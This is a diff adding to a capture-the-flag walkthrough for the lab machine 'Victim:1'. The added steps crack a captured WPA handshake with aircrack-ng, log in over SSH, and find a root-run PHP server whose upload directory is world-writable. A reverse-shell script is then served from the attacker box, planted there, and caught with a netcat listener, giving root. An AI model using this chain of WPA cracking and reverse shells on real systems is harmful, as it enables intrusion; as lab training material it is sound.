@@ -1,8 +1,11 @@
 Dirbusting directory....
 
+robots.txt
+User-agent: *
+Disallow: h@ck3rz!
 
 
-Found .ca file in http://192.168.1.6:8999/
+Found .cap file in http://192.168.1.6:8999/
 
 
 hack@kali:~/CTF/Victim:1$ aircrack-ng WPA-01.cap -w /usr/share/wordlists/rockyou.txt 
@@ -44,6 +47,123 @@ Read 1918 packets.
 
 
 hack@kali:~/CTF/Victim:1$ 
+
+
+
+
+hack@kali:~/CTF/Victim:1$ ssh dlink@192.168.1.19
+The authenticity of host '192.168.1.19 (192.168.1.19)' can't be established.
+ECDSA key fingerprint is SHA256:rlY5QcLGFoLjkoNzEVHA0e3fVUALcYpJ3l9rqJRyPCY.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.1.19' (ECDSA) to the list of known hosts.
+dlink@192.168.1.19's password: 
+Last login: Tue Apr  7 23:36:49 2020 from 192.168.86.99
+dlink@victim01:~$ 
+
+
+In /etc/passwd:
+victim01:x:1001:1003:,,,:/home/victim01:/bin/bash
+dlink:x:1002:1004:,,,:/home/dlink:/bin/bash
+
+
+dlink@victim01:/var/www/bolt/app/config$ cat config.yml 
+database:
+    driver: sqlite
+    databasename: bolt
+
+
+Found this interesting process:
+root      1564  1492  0 20:42 ?        00:00:11 php -S 0.0.0.0:9000 -t /var/www/bolt/public/
+
+Misconfiguration of /files:
+dlink@victim01:/var/www/bolt/public$ ls -la
+total 40
+drwxr-xr-x 7 root root 4096 Apr  7 22:01 .
+drwxr-xr-x 7 root root 4096 Apr  7 20:45 ..
+-rw-r--r-- 1 root root 2956 Aug 25  2018 .htaccess
+drwxr-xr-x 6 root root 4096 Nov 12  2019 bolt-public
+-rwxr-xr-x 1 root root   45 Apr  7 22:01 bolt_start.sh
+drwxr-xr-x 2 root root 4096 Aug 25  2018 extensions
+drwxrwxrwx 2 root root 4096 Nov 12  2019 files
+-rw-r--r-- 1 root root  295 Aug 25  2018 index.php
+drwxr-xr-x 5 root root 4096 Nov 12  2019 theme
+drwxr-xr-x 2 root root 4096 Aug 25  2018 thumbs
+
+
+Import reverse shell:
+hack@kali:~$ python -m SimpleHTTPServer 9999
+Serving HTTP on 0.0.0.0 port 9999 ...
+192.168.1.19 - - [27/May/2020 23:49:18] "GET /reverse-shell.php HTTP/1.1" 200 -
+
+
+Edit reverse-shell.php, copy in /var/bolt/public/files and launch it
+dlink@victim01:~$ cp reverse-shell.php /var/www/bolt/public/files/
+
+
+hack@kali:~/CTF/Victim:1$ nc -lvnp 1234
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 192.168.1.19.
+Ncat: Connection from 192.168.1.19:42696.
+Linux victim01 4.15.0-99-generic #100-Ubuntu SMP Wed Apr 22 20:32:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 21:52:39 up  1:11,  0 users,  load average: 1.12, 0.77, 0.61
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=0(root) gid=0(root) groups=0(root)
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+swap.img
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+# cd root
+# ls
+flag.txt
+snap
+# cat flag.txt
+Nice work!
+
+                .:##:::.
+              .:::::/;;\:.
+        ()::::::@::/;;#;|:.
+        ::::##::::|;;##;|::
+         ':::::::::\;;;/::'
+              ':::::::::::
+               |O|O|O|O|O|O
+               :#:::::::##::.
+              .:###:::::#:::::.
+              :::##:::::::::::#:.
+               ::::;:::::::::###::.
+               ':::;::###::;::#:::::
+                ::::;::#::;::::::::::
+                :##:;::::::;::::###:::     .
+              .:::::; .:::##::::::::::::::::
+              ::::::; :::::::::::::::::##::  #rootdance
+# 
 
 
 
